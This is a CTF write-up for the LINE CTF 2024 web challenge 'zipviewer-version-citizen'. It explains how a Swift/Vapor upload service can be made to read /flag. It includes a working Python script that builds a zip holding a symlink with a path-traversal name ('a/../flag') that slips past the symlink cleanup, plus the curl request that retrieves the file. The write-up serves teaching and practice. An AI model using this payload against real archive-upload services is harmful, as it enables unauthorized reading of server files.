---
tags:
  - ctf
layout: ctf
type: problem
ctf: 2024-line
category: web
title: zipviewer-version-citizen
points: 110
solved: true
---

# zipviewer-version-citizen

## Instructions

Read the flag (/flag)

## Solution

This application allows us to upload a zip file, it is then decompressed, and we are able to download the files that are in the zip file. Our goal is to read outside of the zipfile at /flag. Taking a look at the dependencies for the application, we can see that github.com/weichsel/ZIPFoundation version 0.9.18 is used as the zip decompression library.

```
$ cat Package.swift
// swift-tools-version: 5.9
import PackageDescription

let package = Package(
    name: "zipviewer-version-citizen",
    platforms: [
       .macOS(.v13)
    ],
    dependencies: [
        .package(url: "https://github.com/vapor/vapor.git", exact: "4.89.0"),
        .package(url: "https://github.com/vapor/leaf.git", exact: "4.2.4"),
        .package(url: "https://github.com/weichsel/ZIPFoundation.git", exact: "0.9.18"),
        .package(url: "https://github.com/apple/swift-crypto.git", exact: "3.1.0"),
```


Looking at the Unzip function, we can see that allowUncontainedSymlinks is true which means we should be able to read /flag using a symlink.

```swift
func Unzip(filename: String, filepath: String) throws -> Bool {
    let fileManager = FileManager()
    let currentWorkingPath = fileManager.currentDirectoryPath
 
    var sourceURL = URL(fileURLWithPath: currentWorkingPath)
    sourceURL.appendPathComponent(filename)
    
    var destinationURL = URL(fileURLWithPath: currentWorkingPath)
    destinationURL.appendPathComponent(filepath)
    
    try fileManager.createDirectory(at: destinationURL, withIntermediateDirectories: true, attributes: nil)
    try fileManager.unzipItem(at: sourceURL, to: destinationURL, allowUncontainedSymlinks: true)
 
    return true
}
```


However, the CleanupUploadedFile function attempts to remove symbolic links

```swift
func CleanupUploadedFile(filePath: String, fileList: [String]) throws -> Bool {
    do {
        let fileManager = FileManager()
        let currentWorkingPath = fileManager.currentDirectoryPath

        print("File Count \(fileList.count)")

        for fileName in fileList {
            var originPath = URL(fileURLWithPath: currentWorkingPath)

            originPath.appendPathComponent(filePath)
            originPath.appendPathComponent(fileName)

            if !fileManager.fileExists(atPath: originPath.path) {
                print("file not found")
                continue
            }

            if (try IsSymbolicLink(filePath: originPath.path)) {
                print("Find Symbol!! >> \(originPath.path)")
                try fileManager.removeItem(at: originPath)
            }
        }
    } catch {
        return false
    }

    return true
}
```

To get around this we can upload a zip file where the cleanup code is unable to correctly delete the symlink.

```python
#!/usr/bin/env python3

import zipfile

zipInfo = zipfile.ZipInfo()
zipInfo.create_system = 3
zipInfo.external_attr = 2716663808
zipInfo.filename = "a/../flag"

with zipfile.ZipFile('payload.zip', 'w') as zipf:
    zipf.writestr(zipInfo, "/flag")
```


![](attachments/Pasted%20image%2020240325110740.png)
```shell
$ curl http://localhost:11000/download/flag -H 'Cookie: vapor_session=ZhIGWR15t53Dp25Zyuq4lZ820BkDW2H+y3ydAt1vdkI='

LINECTF{redacted}
```
